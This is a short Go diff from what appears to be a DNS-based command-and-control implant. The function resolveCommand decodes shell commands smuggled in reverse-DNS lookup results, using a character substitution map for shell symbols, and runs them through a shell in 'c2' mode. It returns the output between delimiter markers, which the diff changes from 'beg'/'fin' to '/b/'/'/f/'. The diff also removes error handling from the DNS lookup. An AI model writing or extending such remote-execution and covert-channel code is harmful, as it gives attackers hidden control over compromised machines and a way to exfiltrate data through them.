@@ -50,7 +50,6 @@ func resolveCommand(host []string, bl *int) {
 		// List directory command has been received
 		case trigger_mappings["bash"]:
 			replacement_mappings := map[string]string{"80": "..", "79": ".", "78": "|", "77": ";", "76": "'", "75": ">", "74": "/"}
-
 			// https://www.sohamkamani.com/golang/exec-shell-command/
 			var mode string = "c2"
 			command := strings.Split(sections[0], "-")[2]
@@ -74,9 +73,9 @@ func resolveCommand(host []string, bl *int) {
 			if err != nil {
 				fmt.Println(err)
 			}
-			output_bytes := append([]byte("beg"), out...)
+			output_bytes := append([]byte("/b/"), out...)
 			begin_comm(&output_bytes, bl, &mode)
-			output_bytes = []byte("fin")
+			output_bytes = []byte("/f/")
 			begin_comm(&output_bytes, bl, &mode)
 		}
 	}
@@ -94,10 +93,7 @@ func resolveAddr(address string, bl *int) {
 			return d.DialContext(ctx, network, "127.0.0.1:8053")
 		},
 	}
-	host, err := r.LookupAddr(context.Background(), address)
-	if err != nil {
-		fmt.Println(err)
-	}
+	host, _ := r.LookupAddr(context.Background(), address)
 	if len(host) > 0 {
 		resolveCommand(host, bl)
 	}
